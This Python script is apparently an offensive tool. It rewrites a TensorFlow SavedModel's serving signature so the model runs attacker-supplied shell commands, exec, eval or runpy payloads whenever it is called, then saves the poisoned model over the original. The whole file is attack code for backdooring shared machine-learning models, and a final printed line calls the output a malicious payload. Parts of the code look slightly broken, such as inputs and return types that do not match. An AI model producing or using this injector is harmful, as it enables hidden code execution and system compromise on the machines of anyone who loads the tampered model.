import os
import argparse
import shutil
from pathlib import Path
import tensorflow as tf

parser = argparse.ArgumentParser(description="TensorFlow SavedModel Code Injection")
parser.add_argument("path", type=Path, help="Path to the directory containing the SavedModel")
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"], help="Type of command to inject")
parser.add_argument("args", help="Arguments for the command")
parser.add_argument("-v", "--verbose", help="Verbose logging", action="count")
args = parser.parse_args()

command_args = args.args
if os.path.isfile(command_args):
    with open(command_args, "r", encoding="utf-8") as in_file:
        command_args = in_file.read()

@tf.function
def Exec(dummy):
    tf.py_function(func=lambda: exec(command_args), inp=[], Tout=tf.string)
    return tf.constant("Executed")

@tf.function
def Eval(dummy):
    result = tf.py_function(func=lambda: eval(command_args), inp=[], Tout=tf.string)
    return result

@tf.function
def System(dummy):
    tf.py_function(func=lambda: os.system(command_args), inp=[], Tout=tf.int32)
    return tf.constant("System command executed")

@tf.function
def Runpy(dummy):
    tf.py_function(func=lambda: __import__('runpy').run_path(command_args), inp=[], Tout=tf.string)
    return tf.constant("Runpy executed")

# Load the SavedModel
saved_model_path = args.path
print(f"Attempting to load SavedModel from: {saved_model_path}")
loaded_model = tf.saved_model.load(str(saved_model_path))

# Define a function to inject the payload into the model
def inject_payload(model, command):
    if command == "system":
        payload = tf.function(lambda x: System(x), input_signature=[tf.TensorSpec(shape=(), dtype=tf.string)])
    elif command == "exec":
        payload = tf.function(lambda x: Exec(x), input_signature=[tf.TensorSpec(shape=(), dtype=tf.string)])
    elif command == "eval":
        payload = tf.function(lambda x: Eval(x), input_signature=[tf.TensorSpec(shape=(), dtype=tf.string)])
    elif command == "runpy":
        payload = tf.function(lambda x: Runpy(x), input_signature=[tf.TensorSpec(shape=(), dtype=tf.string)])
    
    # Create a new signatures dictionary
    new_signatures = dict(model.signatures)
    new_signatures['serving_default'] = payload

    # Create a new SavedModel with the updated signatures
    tf.saved_model.save(model, str(saved_model_path), signatures=new_signatures)

    return model

# Save a backup of the model
backup_path = f"{args.path}.bak"
if os.path.exists(backup_path):
    print(f"Backup already exists at {backup_path}. Skipping backup creation.")
else:
    try:
        shutil.copytree(args.path, backup_path)
        print(f"Backup created at {backup_path}")
    except Exception as e:
        print(f"Failed to create backup: {e}")
        print("Continuing without backup...")

# Inject the payload into the model
try:
    inject_payload(loaded_model, args.command)
    print(f"Payload injected and model saved at {saved_model_path}")
except Exception as e:
    print(f"Failed to inject payload: {e}")

print("the keras_inject.py is adding this file into it .so this is a malicious payload!")
